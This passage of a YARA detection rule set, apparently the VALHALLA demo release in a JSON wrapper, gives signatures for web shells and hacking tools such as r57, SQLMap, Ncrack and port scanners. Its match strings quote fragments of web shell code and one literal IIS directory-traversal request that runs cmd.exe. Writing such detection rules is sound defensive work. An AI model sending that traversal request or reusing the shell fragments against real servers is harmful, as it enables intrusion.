\"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"059058a27a7b0059e2c2f007ad4675ef\"\n      hash2 = \"8b457934da3821ba58b06a113e0d53d9\"\n      hash3 = \"90a5ba0c94199269ba33a58bc6a4ad99\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"\\\" <select name='encode' class='input'><option value=''>ANSI</option><option val\" \n      $s7 = \"JSession.setAttribute(\\\"MSG\\\",\\\"<span style='color:red'>Upload File Failed!</spa\" \n      $s8 = \"File f = new File(JSession.getAttribute(CURRENT_DIR)+\\\"/\\\"+fileBean.getFileName(\" \n      $s9 = \"((Invoker)ins.get(\\\"vd\\\")).invoke(request,response,JSession);\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_r57shell127_r57_kartal_r57_RID338E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files r57shell127.php, r57_kartal.php, r57.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:52:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1d912c55b96e2efe8ca873d6040e3b30\"\n      hash2 = \"4108f28a9792b50d95f95b9e5314fa1e\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"$handle = @opendir($dir) or die(\\\"Can't open directory $dir\\\");\" fullword\n      $s3 = \"if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }\" fullword\n      $s5 = \"if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_\" \n   condition: \n      2 of them\n}\n\nrule HKTL_Fierce2_RID2B23 : DEMO HKTL {\n   meta:\n      description = \"This signature detects the Fierce2 domain scanner\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 08:53:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,\" \n   condition: \n      1 of them\n}\n\nrule HKTL_Ncrack_RID2AF5 : DEMO HKTL T1110 {\n   meta:\n      description = \"This signature detects the Ncrack brute force tool\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 09:40:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1110\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NcrackOutputTable only supports adding up to 4096 to a cell via\" \n   condition: \n      1 of them\n}\n\nrule HKTL_SQLMap_RID2AB1 : DEMO HKTL {\n   meta:\n      description = \"This signature detects the SQLMap SQL injection tool\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 07:46:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"except SqlmapBaseException, ex:\" \n   condition: \n      1 of them\n}\n\nrule HKTL_PortScanner_RID2D12 : DEMO HKTL {\n   meta:\n      description = \"Semiautomatically generated YARA rule on file PortScanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 10:16:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Scan Ports Every\" \n      $s3 = \"Scan All Possible Ports!\" \n   condition: \n      all of them\n}\n\nrule HKTL_MooreR_Port_Scanner_RID3024 : DEMO HKTL T1046 {\n   meta:\n      description = \"Semiautomatically generated YARA rule on file MooreR Port Scanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 12:27:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1046\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Description|\" \n      $s3 = \"soft Visual Studio\\\\VB9yp\" \n      $s4 = \"adj_fptan?4\" \n      $s7 = \"DOWS\\\\SyMem32\\\\/o\" \n   condition: \n      all of them\n}\n\nrule HKTL_NetBIOS_Name_Scanner_RID3000 : DEMO HKTL {\n   meta:\n      description = \"Semiautomatically generated YARA rule on file NetBIOS Name Scanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 12:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"IconEx\" \n      $s2 = \"soft Visual Stu\" \n      $s4 = \"NBTScanner!y&\" \n   condition: \n      all of them\n}\n\nrule HKTL_FeliksPack3___Scanners_ipscan_RID33EA : DEMO HKTL {\n   meta:\n      description = \"Semiautomatically generated YARA rule on file ipscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 15:08:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"WCAP;}ECTED\" \n      $s4 = \"NotSupported\" \n      $s6 = \"SCAN.VERSION{_\" \n   condition: \n      all of them\n}\n\nrule HKTL_CGISscan_CGIScan_RID2E25 : DEMO HKTL {\n   meta:\n      description = \"Semiautomatically generated YARA rule on file CGIScan.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 11:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Wang Products\" fullword wide\n      $s2 = \"WSocketResolveHost: Cannot convert host address '%s'\" \n      $s3 = \"tcp is the only protocol supported thru socks server\" \n   condition: \n      all of ( $s* )\n}\n\nrule HKTL_IP_Stealing_Utilities_RID30ED : DEMO HKTL {\n   meta:\n      description = \"Semiautomatically generated YARA rule on file IP Stealing Utilities.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 13:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"DarkKnight\" \n      $s9 = \"IPStealerUtilities\" \n   condition: \n      all of them\n}\n\nrule HKTL_PortRacer_RID2C35 : DEMO HKTL {\n   meta:\n      description = \"Semiautomatically generated YARA rule on file PortRacer.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 09:39:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Auto Scroll BOTH Text Boxes\" \n      $s4 = \"Start/Stop Portscanning\" \n      $s6 = \"Auto Save LogFile by pressing STOP\" \n   condition: \n      all of them\n}\n\nrule HKTL_scanarator_RID2CD1 : DEMO HKTL {\n   meta:\n      description = \"Semiautomatically generated YARA rule on file scanarator.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 10:05:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\" \n   condition: \n      all of them\n}\n\nrule HKTL_Amplia_Security_Tool_RID30AB : DEMO EXE HKTL SUSP T1003 {\n   meta:\n      description = \"Detects Amplia Security Tool like Windows Credential Editor\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2013-01-01 12:49:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-02-14\"\n      tags = \"DEMO, EXE, HKTL, SUSP, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a = \"Amplia Security\" \n      $c = \"getlsasrvaddr.exe\" \n      $d = \"Cannot get PID of LSASS.EXE\" \n      $e = \"extract the TGT session key\" \n      $f = \"PPWDUMP_DATA\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 2 of them ) or 3 of them\n}\n\n/*\n    VALHALLA YARA RULE SET\n    Retrieved: 2025-04-21 19:19\n    Generated for User: demo\n    Number of Rules: 3210\n\n    This is the VALHALLA demo rule set. The content represents the 'signature-base' repository\n    in a streamlined format but lacks the rules provided by 3rd parties.\n    All rules are licensed under CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/.\n*/",
    "uploadedBy": "f0b33c9c-0019-4046-984b-f6f3d95dea61",
    "category": "yar",
    "uploadedAt": "2025-05-07T09:54:43.607Z",
    "status": "active"
}